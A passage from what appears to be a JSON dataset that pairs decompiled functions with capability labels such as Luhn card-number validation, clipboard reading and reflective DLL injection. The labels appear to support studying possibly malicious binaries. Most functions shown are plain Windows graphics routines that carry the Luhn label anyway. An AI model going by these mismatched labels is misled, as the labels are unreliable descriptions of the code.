        "decompiled_code": "\nuint16_t fcn.00429cbc(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 106
    },
    "00429db8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429db8(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.00429cd4();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 235
    },
    "0042a100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042a100(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "0042a1a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a1a8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.0042a150(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 104
    },
    "0042a508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a508(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x42a51f;\n        fcn.00404964();\n    }\n    uStack52 = 0x42a5e5;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00404610();\n    uVar2 = 0;\n    uVar1 = *0x4269a4;\n    fcn.00407480();\n    fcn.0042a688(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x4269a4;\n    fcn.00407480();\n    fcn.0042a688(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x426c30;\n    fcn.00407480();\n    fcn.0042a688(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x426ae8;\n    fcn.00407480();\n    fcn.0042a688(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x42a5ec);\n    return;\n}\n",
        "token_count": 384
    },
    "0042a688": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a688(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42a70b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = fcn.00406348();\n    fcn.004099dc();\n    fcn.004054c0();\n    *puVar1 = arg_8h;\n    fcn.004054c0();\n    puVar1[3] = arg_ch;\n    fcn.004194b8();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42a712;\n    uStack36 = 0x42a70a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 239
    },
    "0042a858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042a858(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 8) = uVar1;\n    fcn.0042a904();\n    fcn.0042a904();\n    fcn.0042a904();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "0042a904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042a904(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42a91f;\n    fcn.004194b8();\n    uStack32 = 0x42a948;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004194b8();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 143
    },
    "0042abc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042abc0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42abdc;\n    iVar1 = fcn.0042a96c();\n    if (iVar1 == 0) {\n        puStack28 = 0x42abec;\n        fcn.00428e2c();\n    }\n    puStack28 = 0x42abf3;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStack32 = 0x42ac37;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piVar2[7] = in_EAX;\n    puStack28 = &stack0xfffffffc;\n    iVar1 = fcn.00404854();\n    piVar2[6] = iVar1;\n    (**(*piVar2 + 0x5c))();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x42ac56;\n    fcn.00404640();\n    *(in_EAX + 0xc) = piVar2;\n    piVar2[5] = in_EAX;\n    uStack32 = 0x42ac6a;\n    iVar1 = fcn.00404854();\n    piVar2[4] = iVar1;\n    uStack32 = 0x42ac7a;\n    fcn.0040483c();\n    return;\n}\n",
        "token_count": 383
    },
    "0042afe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042afe0(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x42af0c;\n    fcn.0042af64(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "0042b44c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b44c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x42b460;\n    fcn.0042b3b8();\n    puStack124 = 0x42b46f;\n    fcn.0041b6b8();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x42b47d;\n        fcn.00428e5c();\n    }\n    puStack124 = 0x42b485;\n    uVar2 = fcn.00402ef0();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x42b50c;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.004030ec();\n    fcn.0041b6b8();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.00428e5c();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x42b513;\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 485
    },
    "0042b69c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b69c(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x42b745;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x42b723;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0040a5c0();\n    fcn.0040e800();\n    fcn.00405894();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.0042a3d8();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 306
    },
    "0042bc1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.0042bc1c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.00428e2c();\n    }\n    fcn.0042b3b8();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 326
    },
    "0042bf44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042bf44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00428554();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "0042c204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c204(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x42c23a;\n        var_4h = param_2;\n        iVar1 = fcn.00429700();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x42c247;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x42c253;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x42c260;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x42c2b3;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.0042c204::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x42c2ba);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0042cc84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cc84(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x42cca2;\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x42cd77;\n            fcn.00419bb8();\n            return;\n        }\n    }\n    uStack104 = 0x42ccb2;\n    fcn.0042d450();\n    uStack104 = 0x4aaa38;\n    puStack108 = 0x42ccbc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack112 = 0x42cd46;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00403ae4();\n        in_stack_ffffff80 = 0;\n        fcn.0042d6c0(0, 0, &fcn.0042cc84::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.0042c138();\n        fcn.0042c13c();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection(0x4aaa38, 0x42cd4d);\n    return;\n}\n",
        "token_count": 505
    },
    "0042cd80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cd80(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.0042cd80::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x42cda5;\n    fcn.0042d450();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x42ce10;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x4aaa1c) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.0042c970();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.0042c30c(*(in_EAX + 0x2c), &fcn.0042cd80::var_5ch);\n    uVar3 = 0;\n    fcn.0042d6c0(0, *(*(in_EAX + 0x28) + 0x70), &fcn.0042cd80::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 436
    },
    "0042ce40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042ce40(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.0042d134();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040f840();\n    return;\n}\n",
        "token_count": 92
    },
    "0042ce70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.0042ce70(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00404610();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.0041b510(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.0042d450();\n    fcn.0040f840();\n    fcn.0042d6c0(arg_8h, *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 264
    },
    "0042d324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0042d324(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0042ce40();\n    iVar1 = *(in_EAX + 0x28);\n    if ((param_2 < 0) || (*(iVar1 + 0x20) <= param_2)) {\n        fcn.00428e14();\n    }\n    fcn.0042d3dc();\n    sub.gdi32.dll_GdiFlush();\n    if (0 < *(iVar1 + 0x38)) {\n        param_2 = (*(iVar1 + 0x38) - param_2) + -1;\n    }\n    iVar2 = fcn.004290f4();\n    return iVar2 * param_2 & 0xffffffff00000000U | iVar2 * param_2 + *(iVar1 + 0x2c);\n}\n",
        "token_count": 216
    },
    "0042dd58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dd58(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.0042d450();\n    if (param_1 == 0) {\n        fcn.00403ae4();\n        fcn.0042d6c0(0, 0, auStack98);\n    }\n    else {\n        fcn.0041b6b8();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.00428e44();\n        }\n        fcn.0042d7e8(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0042e580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e580(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.0042d460();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.0042e580::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x42e5cd;\n    uVar1 = fcn.0042c30c(*(in_EAX + 0x2c), &fcn.0042e580::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x42e5fa;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.0042c970();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 409
    },
    "0042e6cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042e6cc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0042a100();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.0042c138();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 192
    },
    "0042e974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042e974(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x42e98d;\n    piVar1 = fcn.00404610();\n    uStack36 = 0x42ea02;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.0041b48c(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041b6b8();\n    fcn.0041b6b8();\n    if (1 < var_ah._2_2_) {\n        fcn.00428e50();\n    }\n    fcn.0042ea2c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42ea22;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 306
    },
    "0042eaa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042eaa0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint lpvObject;\n    uint var_2ch;\n    uint piconinfo;\n    uint var_ch;\n    uint hgdiobj;\n    int32_t *var_4h;\n    \n    puStack60 = 0x42eab8;\n    var_4h = in_EAX;\n    fcn.0042ea2c();\n    if (param_2 != 0) {\n        puStack60 = &fcn.0042eaa0::piconinfo;\n        puStack68 = 0x42eac6;\n        iStack64 = param_2;\n        iVar1 = sub.user32.dll_GetIconInfo();\n        if (iVar1 != 0) {\n            uStack72 = 0x42eb1d;\n            uStack76 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb4;\n            uVar2 = hgdiobj;\n            puStack68 = &stack0xfffffffc;\n            iVar1 = sub.gdi32.dll_GetObjectA(hgdiobj, 0x18, &fcn.0042eaa0::lpvObject);\n            if (iVar1 != 0) {\n                iVar1 = var_4h[10];\n                *(iVar1 + 0x10) = var_2ch;\n                *(iVar1 + 0x14) = var_2ch;\n            }\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_DeleteObject(var_ch, 0x42eb24);\n            sub.gdi32.dll_DeleteObject(hgdiobj);\n            return;\n        }\n    }\n    puStack68 = 0x42eb2f;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 460
    },
    "0042ec3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0042ec3c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x42ec4a;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x4aaa30;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 221
    },
    "0042ee5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ee5c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 133
    },
    "0042eec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042eec0(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "0042eecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042eecc(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "0042f08c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042f08c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x42f0aa;\n    fcn.0042eec0();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42f0e0;\n    uStack32 = 0x42f0d8;\n    fcn.0042eecc();\n    return;\n}\n",
        "token_count": 211
    },
    "0042f604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
